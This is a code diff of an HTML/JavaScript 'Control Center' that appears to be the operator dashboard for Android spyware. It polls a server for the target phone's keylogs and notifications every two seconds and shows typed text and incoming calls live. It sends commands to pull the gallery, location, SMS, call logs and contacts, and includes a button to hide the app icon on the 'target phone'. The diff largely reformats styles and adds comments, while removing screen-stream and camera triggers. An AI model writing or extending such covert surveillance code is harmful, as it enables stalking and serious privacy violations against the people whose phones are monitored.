@@ -6,7 +6,6 @@
     <title>Control Center</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* CSS WAHI HAI JO TUMNE DIYA THA - NO CHANGES IN STYLE */
         :root {
             --bg-color: #0f0f0f;
             --glass-bg: rgba(255, 255, 255, 0.1);
@@ -30,6 +29,7 @@
             touch-action: pan-y; 
         }
         
+        /* --- FIXED CONTAINER (Laptop Fix + Phone Fix) --- */
         .container {
             width: 100%; 
             max-width: 400px; 
@@ -65,11 +65,16 @@
         .battery-bar-bg { width: 100%; height: 5px; background: #333; border-radius: 10px; overflow: hidden; }
         .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
 
+        /* --- NEW LIVE STATUS BOX --- */
         .live-status-card {
-            background: rgba(0, 243, 255, 0.08);
+            background: rgba(0, 243, 255, 0.08); /* Cyan Tint */
             border: 1px solid rgba(0, 243, 255, 0.3);
-            border-radius: 12px; padding: 12px; margin-bottom: 20px;
-            display: flex; align-items: center; gap: 12px;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
             animation: pulse-border 2s infinite;
         }
         
@@ -80,14 +85,18 @@
         }
 
         .live-icon {
-            width: 35px; height: 35px; background: rgba(0, 243, 255, 0.2);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            color: var(--cyan); font-size: 1rem;
+            width: 35px; height: 35px;
+            background: rgba(0, 243, 255, 0.2);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--cyan);
+            font-size: 1rem;
         }
         .live-content { flex: 1; overflow: hidden; }
         .live-label { font-size: 0.65rem; color: var(--cyan); letter-spacing: 0.5px; margin-bottom: 2px; text-transform: uppercase; font-weight: bold; }
         .live-text { font-size: 0.85rem; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
+        /* --- GRID LAYOUT --- */
         .controls-grid { 
             display: grid; 
             grid-template-columns: repeat(4, 1fr); 
@@ -98,9 +107,15 @@
         .slider-card {
             grid-row: span 2; 
             background: var(--slider-bg);
-            border-radius: 16px; position: relative; overflow: hidden;
-            display: flex; align-items: flex-end; justify-content: center;
-            border: 1px solid var(--glass-border); touch-action: none; width: 100%; 
+            border-radius: 16px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: flex-end; 
+            justify-content: center;
+            border: 1px solid var(--glass-border);
+            touch-action: none;
+            width: 100%; 
         }
 
         .slider-fill {
@@ -115,19 +130,25 @@
         }
 
         .vertical-range {
-            position: absolute; width: 200px; height: 100%; top: 0; left: 50%;
-            transform: translate(-50%, 0) rotate(-90deg); opacity: 0; cursor: ns-resize; z-index: 10;
+            position: absolute; width: 200px; height: 100%;
+            top: 0; left: 50%;
+            transform: translate(-50%, 0) rotate(-90deg);
+            opacity: 0; cursor: ns-resize; z-index: 10;
         }
         
         .control-btn {
-            background: var(--glass-bg); border-radius: 14px; height: 100%; 
+            background: var(--glass-bg); border-radius: 14px; 
+            height: 100%; 
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             border: 1px solid var(--glass-border); cursor: pointer;
-            transition: 0.2s; text-decoration: none; color: var(--text-main); overflow: hidden;
+            transition: 0.2s; text-decoration: none; color: var(--text-main);
+            overflow: hidden;
         }
         .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
+        
         .control-btn i { font-size: 1.1rem; margin-bottom: 5px; }
         .control-btn span { font-size: 0.55rem; text-align: center; color: #bbb; white-space: nowrap; }
+
         .control-btn.active-state { background: rgba(255, 255, 255, 0.9); color: #000; }
         .control-btn.active-state span { color: #333; }
         
@@ -135,12 +156,17 @@
             margin-bottom: 15px; font-size: 0.85rem; color: var(--cyan); cursor: pointer; 
             border: 1px dashed var(--cyan); padding: 10px 20px; border-radius: 12px;
             background: rgba(0, 243, 255, 0.05); text-align: center;
-            width: 90%; max-width: 300px; margin-left: auto; margin-right: auto;
+            width: 90%; max-width: 300px;
+            margin-left: auto; margin-right: auto;
         }
         
         .footer-link {
-            text-align: center; margin-top: 15px; font-size: 0.75rem; color: #555;
-            cursor: pointer; text-decoration: none;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.75rem;
+            color: #555;
+            cursor: pointer;
+            text-decoration: none;
         }
         .footer-link:hover { color: var(--text-muted); }
     </style>
@@ -220,7 +246,6 @@
             
             <div onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
             <div onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></div>
-            
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
             </div>
@@ -261,7 +286,7 @@
                     setStatus(true);
                 }
                 updateDashboard();
-                fetchLiveStatus(); 
+                fetchLiveStatus(); // Start Live Updates
             } else {
                 document.getElementById('idInputPanel').style.display = 'block';
             }
@@ -321,75 +346,78 @@
                 .catch(err => console.log("Connection Error:", err));
         }
 
+        // --- NEW FUNCTION: LIVE ACTIVITY (MSG/CALLS) ---
         async function fetchLiveStatus() {
             if(!DEVICE_ID) return;
+
             try {
+                // Fetch Keylogs (Typed Text) & Notifications (Incoming)
                 const [keylogs, notifs] = await Promise.all([
                     fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/keylogs`).then(r=>r.json()).catch(()=>[]),
                     fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/notifications`).then(r=>r.json()).catch(()=>[])
                 ]);
 
-                let recentCall = notifs.find(n => 
+                let lastActivity = null;
+                let type = 'idle'; // idle, msg, call
+
+                // 1. Check for Calls in Notifications (High Priority)
+                const recentCall = notifs.find(n => 
                     (n.title && (n.title.toLowerCase().includes('call') || n.title.toLowerCase().includes('ringing'))) || 
                     (n.text && (n.text.toLowerCase().includes('incoming call')))
                 );
-                let recentKeylog = keylogs.length > 0 ? keylogs[keylogs.length - 1] : null;
+
+                // 2. Check for latest Keylog (Typing)
+                const recentKeylog = keylogs.length > 0 ? keylogs[keylogs.length - 1] : null;
 
                 const liveIcon = document.getElementById('liveIcon');
                 const liveLabel = document.getElementById('liveLabel');
                 const liveText = document.getElementById('liveText');
 
+                // Logic to decide what to show
                 if (recentCall) {
+                    // Show Call Status
                     liveIcon.innerHTML = '<i class="fa-solid fa-phone-volume" style="animation:tada 1s infinite;"></i>';
                     liveLabel.innerText = "📞 ACTIVE CALL";
                     liveLabel.style.color = "#ff4444"; 
                     liveText.innerText = `${recentCall.title}: ${recentCall.text}`;
-                } else if (recentKeylog) {
+                } 
+                else if (recentKeylog) {
+                    // Show Typing Status
                     liveIcon.innerHTML = '<i class="fa-regular fa-keyboard"></i>';
                     liveLabel.innerText = "⌨️ TYPING NOW";
                     liveLabel.style.color = "#00f3ff";
                     liveText.innerText = `"${recentKeylog.text}"`; 
-                } else {
+                } 
+                else {
+                    // Idle
                     liveIcon.innerHTML = '<i class="fa-solid fa-check"></i>';
                     liveLabel.innerText = "DEVICE ACTIVE";
                     liveLabel.style.color = "#4caf50";
                     liveText.innerText = "No recent typing or calls.";
                 }
+
             } catch (e) { console.log(e); }
         }
 
-        // --- ✅ MAIN CHANGE IS HERE (OPEN VIEW FUNCTION) ---
         function openView(page) {
             if(!DEVICE_ID) return askID();
 
-            // Is list me Screen aur Camera ko add kar diya hai
-            // Taki page khulne se pehle command chala jaye
             const commands = {
-                'gallery': 'gallery', 
-                'location': 'location', 
-                'sms': 'sms',
-                'call_logs': 'call_logs', 
-                'contacts': 'contacts',
-                'screen': 'SCREEN_START', // 🔥 New: Triggers Screen Stream
-                'camera': 'CAM_START'     // 🔥 New: Triggers Camera
+                'gallery': 'gallery', 'location': 'location', 'sms': 'sms',
+                'call_logs': 'call_logs', 'contacts': 'contacts'
             };
 
             if (commands[page]) {
-                // Pehle Command Bhejo
                 sendCommand(commands[page]);
-                
-                // Button par "Requesting..." dikhao
                 const btn = event.currentTarget;
                 const originalText = btn.querySelector('span').innerText;
-                btn.querySelector('span').innerText = "Starting...";
+                btn.querySelector('span').innerText = "Requesting...";
                 
-                // 1.5 Second wait karo taki phone command process kar le
                 setTimeout(() => {
                     btn.querySelector('span').innerText = originalText;
                     window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
                 }, 1500);
             } else {
-                // Agar koi normal page hai to seedha kholo
                 window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
             }
         }
@@ -410,6 +438,7 @@
             .catch(err => console.error("Send Failed", err));
         }
 
+        // --- NEW LOGIC: HIDE APP TRIGGER ---
         function triggerHideApp() {
             if(!DEVICE_ID) return askID();
             if(confirm("WARNING: This will HIDE the app icon on the target phone.\n\nAre you sure you want to proceed?")) {
@@ -460,7 +489,7 @@
         }
 
         setInterval(updateDashboard, 5000);
-        setInterval(fetchLiveStatus, 2000); 
+        setInterval(fetchLiveStatus, 2000); // Check Messages/Calls every 2 sec
         window.onload = initDashboard;
     </script>
 </body> 
